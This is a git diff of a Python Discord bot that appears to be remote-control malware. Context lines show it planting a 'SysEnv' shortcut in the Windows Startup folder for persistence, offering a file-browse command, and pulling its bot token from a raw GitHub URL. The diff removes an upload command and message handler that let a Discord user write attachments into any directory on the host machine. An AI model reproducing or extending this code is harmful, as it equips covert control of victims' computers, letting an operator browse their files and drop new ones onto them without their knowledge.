@@ -45,13 +45,6 @@ startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu
 shortcut_name="SysEnv"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 
-PENDING_DIRS = {}  # {user_id: target_dir}
-MAX_SIZE = 10 * 1024 * 1024  # 10MB
-TIMEOUT = 120  # 2 minutes
-
-def resolve_path(user_path: str) -> Path:
-    """Convert user input to absolute path (DANGEROUS)"""
-    return Path(user_path).expanduser().resolve()
 
 CHANNEL_ID = 1355560563622678699
 
@@ -741,59 +734,6 @@ async def browse(interaction: nextcord.Interaction):
         view = FileView(initial_path, [])
         await interaction.response.send_message("Browse files:", view=view)
 
-@client.slash_command(guild_ids=testServerId, name="upload", description="Start file upload process")
-async def upload_command(
-    interaction: Interaction,
-    directory: str = nextcord.SlashOption(description="Absolute target directory path")
-):
-    try:
-        target_dir = resolve_path(directory)
-        target_dir.mkdir(parents=True, exist_ok=True)
-        
-        # Store pending directory with timeout
-        PENDING_DIRS[interaction.user.id] = target_dir
-        await interaction.response.send_message(
-            f"⚠️ **WARNING: This can access ANY directory**\n"
-            f"Ready to receive files in `{target_dir}`. Upload within {TIMEOUT//60} minutes.",
-            ephemeral=False
-        )
-        
-        # Set timeout
-        await asyncio.sleep(TIMEOUT)
-        if interaction.user.id in PENDING_DIRS:
-            del PENDING_DIRS[interaction.user.id]
-            await interaction.followup.send("⌛ Upload timed out", ephemeral=False)
-
-    except Exception as e:
-        await interaction.response.send_message(
-            f"❌ Setup failed: {str(e)}",
-            ephemeral=False
-        )
-
-@client.event
-async def on_message(message):
-    if message.author.bot or not message.attachments:
-        return
-
-    user_id = message.author.id
-    if user_id not in PENDING_DIRS:
-        return
-
-    target_dir = PENDING_DIRS[user_id]
-    del PENDING_DIRS[user_id]
-
-    try:
-        for attachment in message.attachments:
-            if attachment.size > MAX_SIZE:
-                raise ValueError(f"{attachment.filename} exceeds 10MB limit")
-
-            file_path = target_dir / attachment.filename
-            await attachment.save(file_path)
-
-        await message.reply(f"✅ Saved to `{target_dir}`", mention_author=False)
-
-    except Exception as e:
-        await message.reply(f"❌ Failed: {str(e)}", mention_author=False)
 
 print("Getting token")
 r = requests.get("https://raw.githubusercontent.com/skibidi-123456/skibidi/refs/heads/info/token")
